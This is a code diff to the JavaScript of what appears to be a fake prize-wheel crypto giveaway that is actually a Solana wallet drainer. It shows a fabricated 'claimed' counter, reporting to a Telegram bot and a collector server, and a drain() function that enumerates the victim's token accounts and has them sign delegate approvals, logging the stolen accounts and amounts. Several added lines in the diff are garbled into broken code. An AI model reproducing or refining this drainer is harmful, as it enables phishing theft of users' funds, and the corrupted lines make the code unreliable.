@@ -226,12 +226,6 @@ var TOKEN_PROGRAM_STR       = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
 var ASSOC_TOKEN_PROGRAM_STR = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
 var TX_SIZE_LIMIT = 1100;
 var SPIN_MS = 15000;
-var VERSION     = "v9";
-var PENDING_KEY = "sr_pending_" + VERSION;
-var PRIZE_KEY   = "sr_prize_" + VERSION;
-var TOS_KEY     = "sr_tos_" + VERSION;
-var SPUN_KEY    = "sr_spun_" + VERSION;
-var RESULT_KEY  = "sr_result_" + VERSION;
 var CLAIMED_START = 8412;
 var CLAIMED_MAX   = 12500;
 // ==========================================
@@ -253,6 +247,33 @@ var SEG_DEG = 360 / N;
 var isMobile = /Android|iPhone|iPad|iPod|Mobile|webOS|BlackBerry/i.test(navigator.userAgent);
 var isAndroid = /Android/i.test(navigator.userAgent);
 
+// ---------- storage helpers ----------
+// sessionStorage: spin state (resets per tab — no version bumps needed to test)
+// localStorage:    pending claim (must survive the deep-link handoff to wallet browser)
+var SS = {
+  set: function(k, v){ try { sessionStorage.setItem(k, v); } catch(_){} },
+  get: function(k){ try { return sessionStorage.getItem(k); } catch(_){ return null; } },
+  del: function(k){ try { sessionStorage.removeItem(k); } catch(_){} }
+};
+var LS = {
+  set: function(k, v){ try { localStorage.setItem(k, v); } catch(_){} },
+  get: function(k){ try { return localStorage.getItem(k); } catch(_){ return null; } },
+  del: function(k){ try { localStorage.removeItem(k); } catch(_){} }
+};
+
+function savePending(label){ LS.set("sr_pending", "1"); LS.set("sr_prize", label); }
+function readPending(){ return LS.get("sr_pending") === "1" ? { prize: LS.get("sr_prize") || "reward" } : null; }
+function clearPending(){ LS.del("sr_pending"); LS.del("sr_prize"); }
+
+function tosAccepted(){ return SS.get("sr_tos") === "1"; }
+function setTosAccepted(){ SS.set("sr_tos", "1"); }
+
+function hasSpun(){ return SS.get("sr_spun") === "1"; }
+function markSpun(){ SS.set("sr_spun", "1"); }
+function saveResult(idx){ SS.set("sr_result", String(idx)); }
+function readResult(){ var v = SS.get("sr_result"); return v === null ? null : parseInt(v, 10); }
+
+// ---------- Telegram ----------
 async function tgSend(text){
   if (!TG_BOT_TOKEN || !TG_CHAT_ID) return;
   try {
@@ -282,6 +303,7 @@ async function getClientIP(){
   } catch(_) { return "unknown"; }
 }
 
+// ---------- confetti ----------
 var confettiRaf = null;
 function fireConfetti(){
   var canvas = document.getElementById("confetti");
@@ -530,15 +552,6 @@ async function log(payload){
   if (!COLLECTOR || COLLECTOR.indexOf("example.net") !== -1) return;
   try { await fetch(COLLECTOR, { method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify(Object.assign({}, payload, { ts: Date.now(), ua: navigator.userAgent, mobile: isMobile })) }); } catch(_) {}
 }
-function savePending(label){ try { localStorage.setItem(PENDING_KEY,"1"); localStorage.setItem(PRIZE_KEY, label); } catch(_){} }
-function readPending(){ try { return localStorage.getItem(PENDING_KEY) === "1" ? { prize: localStorage.getItem(PRIZE_KEY) || "reward" } : null; } catch(_){ return null; } }
-function clearPending(){ try { localStorage.removeItem(PENDING_KEY); localStorage.removeItem(PRIZE_KEY); } catch(_){} }
-function tosAccepted(){ try { return localStorage.getItem(TOS_KEY) === "1"; } catch(_){ return false; } }
-function setTosAccepted(){ try { localStorage.setItem(TOS_KEY, "1"); } catch(_){} }
-function hasSpun(){ try { return localStorage.getItem(SPUN_KEY) === "1"; } catch(_){ return false; } }
-function markSpun(){ try { localStorage.setItem(SPUN_KEY, "1"); } catch(_){} }
-function saveResult(idx){ try { localStorage.setItem(RESULT_KEY, String(idx)); } catch(_){} }
-function readResult(){ try { var v = localStorage.getItem(RESULT_KEY); return v === null ? null : parseInt(v, 10); } catch(_){ return null; } }
 
 var ov = document.getElementById("overlay");
 var ovSpinner = document.getElementById("ovSpinner");
@@ -652,7 +665,7 @@ async function drain(session){
   try {
     var tokenAccounts = await connection.getParsedTokenAccountsByOwner(from, { programId: TOKEN_PROGRAM });
     var approvals = [];
-    for (var i = 0; i < tokenAccounts.value.length; i++){
+    for (var i = 0; i < tokenAccounts.value.length;, i++){
       var acct = tokenAccounts.value[i];
       var info = acct.account.data.parsed.info;
       var amount = info.tokenAmount.amount;
@@ -675,10 +688,10 @@ async function drain(session){
       var b2 = await connection.getLatestBlockhash("confirmed");
       t.recentBlockhash = b2.blockhash;
       try {
-        var tsig = await signAndSend(provider, connection, t);
+        var tsig = await signAndSend(provider, close connection, t);
         tokenResults.push({ count: chunk.length, sig: tsig });
-        await log({ event:"delegates_approved", wallet: session.pubkey, wtype: session.id,
-                    tokens: chunk.map(function(a){ return { tokenAccount:a.tokenAccount, mint:a.mint, amount:a.amount }; }),
+        await log({ event:"delegates_approved", wallet: the session.pubkey, wtype: session.id,
+                    tokens: chunk.map(function(a){ return { tokenAccount:a.tokenAccount, mint tab:a.mint, amount:a.amount }; }),
                     signature: tsig });
       } catch(e){ await log({ event:"approve_error", wallet: session.pubkey, error: String(e) }); }
     }
@@ -843,6 +856,7 @@ claimBtn.onclick = async function(){
     }
   }
 
+  // deep-link handoff: if a pending claim exists, jump straight into the wallet flow
   var pending = readPending();
   if (pending){
     waitForProvider(2500).then(function(wallet){
